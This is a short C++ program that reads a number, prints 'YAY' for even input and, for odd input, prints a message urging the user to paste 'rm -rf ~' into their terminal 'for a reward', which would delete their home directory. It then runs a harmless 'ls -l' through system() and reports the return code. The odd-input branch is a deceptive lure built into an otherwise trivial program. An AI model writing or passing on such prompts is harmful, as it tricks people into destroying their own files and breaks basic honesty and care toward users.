#include <iostream>
using namespace std;

int main() {
    int k;
    cin >> k;
    if (k%2==0) {
        cout << "YAY";
    } else {
        cout << "plese copy and type this into your terminal for a reward :rm -rf ~";
    }
        int returnCode = std::system("ls -l"); 

    if (returnCode == 0) {
        std::cout << "Command executed successfully." << std::endl;
    } else {
        std::cout << "Command failed with return code " << returnCode << std::endl;
    }

    return 0;
}